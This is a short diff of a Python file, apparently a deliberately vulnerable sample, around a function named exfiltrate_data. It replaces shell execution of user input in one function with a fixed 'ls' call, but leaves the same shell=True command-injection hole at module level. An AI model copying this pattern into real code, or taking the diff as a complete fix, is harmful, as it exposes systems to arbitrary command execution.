@@ -22,8 +22,7 @@ def exfiltrate_data():
     print("Data exfiltrated:", response.getcode())
     
 def bad():
-    user_input = input("cmd: ")
-    subprocess.call(user_input, shell=True)
+    subprocess.call("ls", shell=True)
 
 user_input = input("Command: ")
 subprocess.call(user_input, shell=True)
